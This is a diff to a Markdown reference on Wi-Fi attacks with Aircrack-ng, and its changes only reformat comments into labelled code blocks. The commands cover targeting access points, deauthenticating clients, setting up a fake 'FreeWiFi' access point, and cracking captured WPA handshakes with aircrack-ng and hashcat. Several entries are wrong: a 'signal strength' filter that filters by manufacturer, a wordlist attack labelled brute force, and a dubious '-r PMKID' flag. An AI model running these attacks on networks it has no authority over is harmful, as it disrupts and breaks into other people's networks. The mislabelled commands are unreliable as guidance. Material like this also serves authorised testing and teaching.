@@ -91,14 +91,19 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Basic Scanning"
 
     ### **Method 1: Basic AP Scan**
+    
+    **Scan all channels:**
     ```bash
-    # Scan all channels
     sudo airodump-ng wlan0mon
+    ```
 
-    # Scan specific channel
+    **Scan specific channel:**
+    ```bash
     sudo airodump-ng -c 6 wlan0mon
+    ```
 
-    # Scan multiple channels
+    **Scan multiple channels:**
+    ```bash
     sudo airodump-ng -c 1,6,11 wlan0mon
     ```
 
@@ -110,14 +115,19 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Target Specific"
 
     ### **Method 2: Target Specific Networks**
+    
+    **Target by BSSID:**
     ```bash
-    # Target by BSSID
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
+    ```
 
-    # Target by ESSID (network name)
+    **Target by ESSID (network name):**
+    ```bash
     sudo airodump-ng -c 6 --essid "TargetNetwork" wlan0mon
+    ```
 
-    # Target with file output
+    **Target with file output:**
+    ```bash
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
     ```
 
@@ -129,14 +139,19 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Advanced Filtering"
 
     ### **Method 3: Advanced Filtering**
+    
+    **Filter by encryption:**
     ```bash
-    # Filter by encryption
     sudo airodump-ng --encrypt WPA wlan0mon
+    ```
 
-    # Filter by manufacturer
+    **Filter by manufacturer:**
+    ```bash
     sudo airodump-ng --manufacturer "Cisco" wlan0mon
+    ```
 
-    # Filter by signal strength
+    **Filter by signal strength:**
+    ```bash
     sudo airodump-ng --manufacturer "Netgear" wlan0mon
     ```
 
@@ -152,30 +167,34 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Passive Capture"
 
     ### **Method 1: Passive Capture**
+    
+    **Start capture:**
     ```bash
-    # Start capture
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
-
-    # Wait for client to connect naturally
-    # Monitor for WPA handshake in top-right corner
     ```
 
     !!! tip "Passive Capture"
         - **Pros**: No interference, stealthy
         - **Cons**: Requires patience, depends on client activity
         - **Best for**: High-traffic networks with regular connections
+        - **Note**: Wait for client to connect naturally and monitor for WPA handshake in top-right corner
 
 === "Active Deauth"
 
     ### **Method 2: Active Deauth Attack**
+    
+    **Terminal 1 - Capture handshake:**
     ```bash
-    # Terminal 1: Capture handshake
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+    ```
 
-    # Terminal 2: Deauth attack
+    **Terminal 2 - Deauth attack:**
+    ```bash
     sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+    ```
 
-    # Terminal 3: Target specific client
+    **Terminal 3 - Target specific client:**
+    ```bash
     sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan0mon
     ```
 
@@ -187,11 +206,14 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Fake AP Attack"
 
     ### **Method 3: Fake AP Attack**
+    
+    **Create fake AP:**
     ```bash
-    # Create fake AP
     sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" wlan0mon
+    ```
 
-    # Capture handshakes from connecting clients
+    **Capture handshakes from connecting clients:**
+    ```bash
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w fake_handshake wlan0mon
     ```
 
@@ -207,14 +229,19 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Dictionary Attack"
 
     ### **Method 1: Dictionary Attack**
+    
+    **Basic dictionary attack:**
     ```bash
-    # Basic dictionary attack
     sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
+    ```
 
-    # Custom wordlist
+    **Custom wordlist:**
+    ```bash
     sudo aircrack-ng -w /path/to/custom.txt handshake-01.cap
+    ```
 
-    # Multiple wordlists
+    **Multiple wordlists:**
+    ```bash
     sudo aircrack-ng -w wordlist1.txt,wordlist2.txt handshake-01.cap
     ```
 
@@ -226,11 +253,14 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Brute Force Attack"
 
     ### **Method 2: Brute Force Attack**
+    
+    **4-way handshake brute force:**
     ```bash
-    # 4-way handshake brute force
     sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
+    ```
 
-    # PMKID attack (if supported)
+    **PMKID attack (if supported):**
+    ```bash
     sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -r PMKID handshake-01.cap
     ```
 
@@ -242,14 +272,19 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 === "Hashcat Integration"
 
     ### **Method 3: Hashcat Integration**
+    
+    **Convert cap to hccapx:**
     ```bash
-    # Convert cap to hccapx
     cap2hccapx handshake-01.cap handshake.hccapx
+    ```
 
-    # Hashcat attack
+    **Hashcat attack:**
+    ```bash
     hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
+    ```
 
-    # GPU acceleration
+    **GPU acceleration:**
+    ```bash
     hashcat -m 2500 -d 1 handshake.hccapx /usr/share/wordlists/rockyou.txt
     ```
 
